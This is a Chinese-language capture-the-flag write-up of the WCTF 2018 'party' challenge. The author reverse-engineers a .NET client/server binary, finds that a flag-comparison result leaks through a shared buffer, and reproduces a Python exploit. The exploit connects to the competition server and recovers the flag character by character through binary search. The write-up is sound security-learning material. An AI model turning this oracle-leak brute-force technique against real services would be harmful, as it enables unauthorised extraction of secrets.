悄咪咪的参加了WCTF的线上赛，本弱鸡表示一脸懵逼，当时只看了party和Cyber_Mimic_Defense。反正是没做出来，赛后看了  
[WCTF-party](https://mhackeroni.it/archive/2018/07/08/wctf-2018-party.html)  
总结下party的解法。  
顺便还是.net逆向初体验233.
# 0x00
附件就一个exe文件  
打开大约是这样的，一个是server功能，一个是client功能。很显然我们要获取server上存储的flag。
客户端能进行的操作
  1. 可以设置party的guest
  2. 可以给guest添加friendship
  3. 设置Erods Scruity
  4. Evaluate Party目测是和服务器通讯
评价后会有
我然后抓了下包看了下通信的协议,大致是这样的  
2 \暂时用途不明  
x \ 总共的guest数,example: 4  
v \Erdos security ,example:10 (最大是10  
n \ n组配对的好友 example: 2  
a b \两个int，表示好友在储存的下标 （0 1）（2 3）  
好像没有什么值得利用的地方,只能开始看看源码了
# 0x01
查阅资料得知，这是.net程序，于是用dnSpy打开进行逆向，还好没加壳。  
首先看到发信的地方，有个switch，根据数据的第一个协议决定运行哪个模块  
  1. 一个简单的输出
  2. 用户界面实际使用的协议，解释了前面2的用途
  3. 一个flag接受+检查机制  
查了下Compare方法  
所有的查询存在了comm的0-3 bytes里。
  4. 如果全是0则表示存在该子串
  5. 如果flag>text 则返回一个正数
  6. flagflag，返回负数，comm[3]=-1，返回disapprove。
  * 如果输入为存在字串则返回correct。  
因此根据二分查找就可以爆破出flag。贴出原wp的exp。
    from socket import socket
    import time
    host = '180.163.241.15'
    port = 10658
    def testflag(flag):
        sock = socket()
        sock.connect((host, port))
        # overwrite comm
        sock.send(b'3\n')
        sock.send(b'1\n')  # one line
        sock.send(flag.encode() + b'\n')
        res = b''
        while not (b'Correct' in res or b'Incorrect' in res):
            time.sleep(0.1)
            res += sock.recv(1024)
        print(res)
        if b'Correct' in res:
            return 0
        # leak sign bit
        sock.send(b'2\n')
        sock.send(b'6\n')  # 6 nodes
        sock.send(b'6\n')  # threshold = 6
        sock.send(b'0\n')  # no edges
        res = b''
        while not b'party' in res:
            time.sleep(0.1)
            res += sock.recv(1024)
        print(res)
        sock.close()
        if b'does not approve' in res:
            return 1  # flag is bigger
        elif b'approves' in res:
            return -1  # flag is smaller
        else:
            raise Exception('something wrong')
    flag = ''
    newchar = ''
    for l in range(100):
        flag += newchar
        print(l)
        print(flag)
        minv = 0x20
        maxv = 0x7e
        while minv != maxv:
            newchar = chr(minv + (maxv - minv) // 2)
            newflag = flag + newchar
            print(minv, maxv)
            res = testflag(newflag)
            if res > 0:
                # character is too small, or the string is too short
                minv = minv + (maxv - minv + 1) // 2
            elif res < 0:
                # character is too big
                maxv = minv + (maxv - minv) // 2
            else:
                print('Flag found!', newflag)
                exit()
        # check off-by-one because of the different string length
        if testflag(flag + newchar) < 0:
            newchar = chr(ord(newchar) - 1)